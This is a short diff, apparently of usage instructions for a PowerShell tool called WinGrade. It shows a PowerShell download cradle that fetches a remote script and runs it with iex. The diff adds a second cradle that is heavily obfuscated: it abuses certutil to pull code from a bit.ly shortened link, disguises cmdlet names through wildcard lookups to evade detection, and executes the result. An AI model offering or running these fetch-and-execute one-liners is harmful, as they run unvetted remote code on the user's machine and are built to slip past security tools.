@@ -13,6 +13,12 @@ or
 
 powershell "$down=New-Object Net.WebClient;$down.Headers['User-Agent']='Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19';$down.DownloadString('https://raw.githubusercontent.com/Crypt2Shell/WinGrade/master/scripts/search.ps1')|iex"
 
+or
+
+iex(((C:\Windows\System32\certutil -ping https://bit.ly/2tZuas2|&(GV *ecu*t -ValueOn).InvokeComm
+and.(((GV *ecu*t -ValueOn).InvokeCommand.PsObject.Methods|Where-Object{$_.Name-ilike'Ge*ts'}).Name).Invoke('*ct-Ob*')-Sk
+ip 2|&(GV *ecu*t -ValueOn).InvokeCommand.(((GV *ecu*t -ValueOn).InvokeCommand.PsObject.Methods|Where-Object{$_.Name-ilik
+e'Ge*ts'}).Name).Invoke('*ct-Ob*')-SkipLast 1)-Join"`r`n"))
 
 
 In the Windows Command Prompt.
